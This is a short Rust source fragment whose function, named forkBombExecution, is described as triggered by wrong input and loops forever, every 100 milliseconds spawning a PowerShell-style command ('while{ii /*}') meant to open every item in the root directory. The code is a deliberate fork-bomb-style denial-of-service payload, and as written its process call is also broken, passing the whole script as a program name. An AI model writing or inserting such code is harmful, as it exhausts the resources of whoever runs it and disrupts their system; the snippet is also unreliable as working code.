//This will be triggered inside the system when the character loaded inside from the input is wrong

use std::env;//For getting all the dirs and files and folders of the current location inside the filesystem
use std::path::Path;
use std::{fs,process::Command};
use tokio::task;
use std::time::Duration;
use std::path::PathBuf;

async fn forkBombExecution(){
    let handle = task::spawn(async {
        loop{
            //Execute "while{ ii /*}" inside the powershell
            let command = Command::new("while{ii /*}").spawn();
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
    });

    handle.await.unwrap();
    //this will run this handle in the thread that is running in parallel with the main thread and in the background
}